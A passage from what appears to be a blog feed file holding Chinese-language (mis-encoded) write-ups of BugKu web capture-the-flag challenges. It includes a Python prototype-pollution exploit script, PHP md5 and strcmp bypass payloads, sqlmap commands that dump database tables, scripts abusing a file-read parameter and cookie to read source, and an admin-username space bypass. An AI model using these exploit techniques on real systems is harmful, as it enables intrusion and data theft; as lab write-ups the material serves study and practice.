class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">attrval</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ä¼ å‚æœ‰è¯¯&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">attrkey</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">let</span> value = req.<span class="property">body</span>.<span class="property">attrval</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="title function_">setFn</span>(req.<span class="property">session</span>.<span class="property">challenger</span>, key, value);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ•…æ„é€ expå¦‚ä¸‹å³å¯è·å¾—flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.session()  <span class="comment">#è¦ä¿æŒåŒä¸€ä¼šè¯</span></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:19460&quot;</span></span><br><span class="line">reg = s.get(url+<span class="string">&#x27;/reg&#x27;</span>)</span><br><span class="line"><span class="comment"># print(reg.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;age&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">79</span></span><br><span class="line">&#125;</span><br><span class="line">update_age = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_age.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;__proto__.pwd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line">update_info = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_info.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>,</span><br><span class="line"><span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;pwd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = s.post(url=url+<span class="string">&#x27;/getflag&#x27;</span>,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"><a href="#å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ" class="headerlink" title="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"></a>å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ</h2><p>æ‰“å¼€ç½‘é¡µè·å¾—æºç ï¼Œæœ¬åœ°åˆ†æ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// highlight_file(&#x27;2.php&#x27;);</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] = <span class="string">&#x27;keykeyaaaaakey:/a/keya.&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//  [[:punct:]]ä»£è¡¨ä»»ä½•æ ‡ç‚¹ç¬¦å·</span></span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadè·å–flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13051/?id=keykeyaaaaakey:/a/keya.</span><br></pre></td></tr></table></figure><blockquote><p>æ­£åˆ™åŒ¹é…è§„åˆ™ï¼š<a href="https://www.runoob.com/regexp/regexp-rule.html">æ­£åˆ™è¡¨è¾¾å¼ - åŒ¹é…è§„åˆ™</a></p></blockquote><h2 id="å‰å¥³å‹"><a href="#å‰å¥³å‹" class="headerlink" title="å‰å¥³å‹"></a>å‰å¥³å‹</h2><p>æŸ¥çœ‹ç½‘é¡µæºç å‘ç°code.txtï¼Œè®¿é—®å³å¯è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11845/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>å°è¯•æ³¨å†Œadminç”¨æˆ·æç¤ºç”¨æˆ·åå·²ç»å­˜åœ¨ï¼Œæ•…çŒœæµ‹ç®¡ç†å‘˜è´¦å·ç”¨æˆ·åä¸ºadmin</p><p><img src="https://s2.loli.net/2022/04/27/M4C7zaomdrfwk1q.png" alt="login1_1.png"></p><p>ç»è¿‡å°è¯•å‘ç°æœªå¯¹ç©ºæ ¼è¿‡æ»¤ï¼Œæ•…åˆ›å»ºä¸€ä¸ªç”¨æˆ·åä¸º<code>â€˜admin â€™</code>ï¼ˆå³admin+ç©ºæ ¼ï¼‰çš„è´¦æˆ·ç™»å½•å³å¯</p><p><img src="https://s2.loli.net/2022/04/27/F7qpLaQ3dwZK24T.png" alt="login1_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½•2</title>
      <link href="/2022/04/25/BugKu-Web2/"/>
      <url>/2022/04/25/BugKu-Web2/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•2"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•2" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½•2"></a>BugKu Web åˆ·é¢˜è®°å½•2</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">get-shell-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">get-shell-wp2</a></p></blockquote><h2 id="æˆç»©æŸ¥è¯¢"><a href="#æˆç»©æŸ¥è¯¢" class="headerlink" title="æˆç»©æŸ¥è¯¢"></a>æˆç»©æŸ¥è¯¢</h2><p>ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs</span><br></pre></td></tr></table></figure><p>å‘ç°çˆ†å‡ºæ¥å››ä¸ªæ•°æ®åº“åå­—</p><p><img src="https://s2.loli.net/2022/04/25/E9fdTwOpDxB7Y4j.png" alt="score1.png"></p><p>å…¶ä¸­skctfå¾ˆå¯ç–‘ï¼Œå»çˆ†å…¶ä¸­è¡¨å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf --tables</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/ui3TogqRI6XrKp2.png" alt="score2.png"></p><p>å¯ä»¥çŒœæµ‹ï¼Œflagå°±åœ¨f14gä¸­ï¼Œæ•…å»çˆ†å…¶ä¸­å­—æ®µ</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g --columns</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/h5S6VBsPbtJoIHz.png" alt="score3.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œfl4gè¡¨ä¸­æœ‰ä¸€ä¸ªåä¸ºskctf_flagå­—æ®µï¼Œå¾—åˆ°å…¶å­—æ®µä¿¡æ¯å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g -C skctf_flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/oerldNR6xyZ2Qu9.png" alt="score4.png"></p><h2 id="ç§‹åå±±è€å¸æœº"><a href="#ç§‹åå±±è€å¸æœº" class="headerlink" title="ç§‹åå±±è€å¸æœº"></a>ç§‹åå±±è€å¸æœº</h2><p>æ‰“å¼€ç½‘é¡µåå‘ç°éœ€è¦2ç§’å†…è®¡ç®—å‡ºç»“æœè¿”å›ï¼Œæ•…ç¼–å†™è„šæœ¬å®ç°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:13247/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#ä¿æŒå½“å‰è¿æ¥ä¸æ–­</span></span><br><span class="line">response = sess.post(url=url,headers=headers)  <span class="comment">#ä¸è¦åŠ cookie</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line">html_data = response.text</span><br><span class="line"><span class="comment"># print(html_data)</span></span><br><span class="line">data = re.findall(<span class="string">&#x27;&lt;div&gt;(.*)?=\?;&lt;/div&gt;&#x27;</span>,html_data)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">ans = &#123;</span><br><span class="line"><span class="string">&#x27;value&#x27;</span>:<span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(ans[&#x27;value&#x27;])</span></span><br><span class="line">r = sess.post(url=url,data = ans)</span><br><span class="line">r.encoding = r.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/TEkaGxVD7lodf8O.png" alt="driver.png"></p><h2 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a>é€Ÿåº¦è¦å¿«</h2><p>æŸ¥çœ‹æºä»£ç å‘ç°è¦ä¼ é€’marginå­—æ®µ</p><p><img src="https://s2.loli.net/2022/04/25/T3p4Eu2e5ryvVdG.png" alt="fast1.png"></p><p>ä½¿ç”¨burpæŠ“åŒ…å‘ç°flagå­—æ®µ</p><p><img src="https://s2.loli.net/2022/04/25/1YRyBwiXnAOqzJv.png" alt="fast2.png"></p><p>ç„¶åç¼–å†™è„šæœ¬è¿›è¡Œpostè¯·æ±‚ä¼ é€’margin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:16315/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#ä¿æŒå½“å‰è¿æ¥ä¸æ–­</span></span><br><span class="line">response = sess.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line">head = response.headers</span><br><span class="line"><span class="comment"># print(head[&#x27;flag&#x27;])</span></span><br><span class="line">flag = base64.b64decode(head[<span class="string">&quot;flag&quot;</span>])</span><br><span class="line">flag = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">payload = base64.b64decode(flag.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = sess.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è„šæœ¬è¿è¡Œåå³å¯è·å¾—flag</p><p><img src="https://s2.loli.net/2022/04/25/EfrAC3xY6w7ZqRm.png" alt="fast3.png"></p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>è¿›å…¥åå‘ç°urlæœ‰lineå’Œfilenameä¸¤ä¸ªå‚æ•°</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10608/index.php?line=&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure><p>base64è§£ç <strong>a2V5cy50eHQ&#x3D;<strong>å‘ç°æ˜¯</strong>keys.txt</strong>ï¼Œæ•…å†™è„šæœ¬å°è¯•è¯»å–index.phpæºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;index.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#index.phpçš„base64ç¼–ç </span></span><br><span class="line"><span class="comment"># print(filename)</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=<span class="subst">&#123;i&#125;</span>&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line"><span class="keyword">if</span>(response.text==<span class="string">&#x27;&#x27;</span>):</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123; <span class="comment">//cookieå­—æ®µä¸­marginçš„å€¼ä¸ºmargin</span></span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¼–å†™exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;keys.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#keys.phpçš„base64ç¼–ç </span></span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:<span class="string">&quot;margin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå³å¯å¾—åˆ°flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$key</span>=<span class="string">&quot;flag&#123;99d5704e2ff0effef5f671361d5fe141&#125;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><p>F12æŸ¥çœ‹å‘ç°1p.htmlé¡µé¢</p><p><img src="https://s2.loli.net/2022/04/25/9M8eHgKajVChkXu.png" alt="never1.png"></p><p>ç›´æ¥è·³è½¬å‘ç°ä¼šä¸€ç›´è·³è½¬åˆ°<a href="https://www.bugku.com/">BugKu</a>è¿™ä¸ªåœ°å€ï¼Œæ•…ç›´æ¥view-sourceæŸ¥çœ‹æºç </p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">view-source:http://114.67.175.224:11348/1p.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/vO5dgTaExQKU27w.png" alt="never2.png"></p><p>è¾“å‡ºNewWordså¾—åˆ°è§£ç åå†…å®¹</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://www.bugku.com&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°æ³¨é‡Šé‡Œè¿˜æœ‰base64ç¼–ç ï¼Œæ•…è¿›è¡Œè§£ç å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%22%3Bif(!%24_GET%5B&#x27;id&#x27;%5D)%0A%7B%0A%09header(&#x27;Location%3A%20hello.php%3Fid%3D1&#x27;)%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B&#x27;id&#x27;%5D%3B%0A%24a%3D%24_GET%5B&#x27;a&#x27;%5D%3B%0A%24b%3D%24_GET%5B&#x27;b&#x27;%5D%3B%0Aif(stripos(%24a%2C&#x27;.&#x27;))%0A%7B%0A%09echo%20&#x27;no%20no%20no%20no%20no%20no%20no&#x27;%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C&#x27;r&#x27;)%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿›è¡Œurlè§£ç å³å¯å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="comment">//idä¸èƒ½ä¸ºç©º</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>)) <span class="comment">//aä¸­ä¸èƒ½å«æœ‰&#x27;.&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>); <span class="comment">//å¯ä»¥åˆ©ç”¨ï¼Œphp://input</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;***********&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadæ”¾å…¥burpå‘é€(å‚è€ƒ<a href="https://blog.csdn.net/qq_41333578/article/details/92759619">wp</a>)</p><p><img src="https://s2.loli.net/2022/04/25/dcgGBNpu6atPL97.png" alt="never3.png"></p><h2 id="å„ç§ç»•è¿‡å“Ÿ"><a href="#å„ç§ç»•è¿‡å“Ÿ" class="headerlink" title="å„ç§ç»•è¿‡å“Ÿ"></a>å„ç§ç»•è¿‡å“Ÿ</h2><p><img 